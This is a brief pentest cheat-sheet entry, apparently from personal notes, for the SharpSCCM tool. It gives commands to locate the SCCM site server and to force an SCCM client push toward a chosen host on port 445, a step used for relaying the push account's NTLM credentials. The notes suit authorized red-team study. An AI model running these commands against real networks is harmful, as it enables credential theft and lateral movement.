### Source
https://github.com/Mayyhem/SharpSCCM

### Identify SCCM server on local machine
```
SharpSCCM.exe local siteinfo
```

### Initiate Client Push (for relaying)
```
SharpSCCM.exe &lt;server&gt; &lt;siteCode&gt; invoke client-push -t "&lt;windowsHostNetbiosName&gt;@445"
```


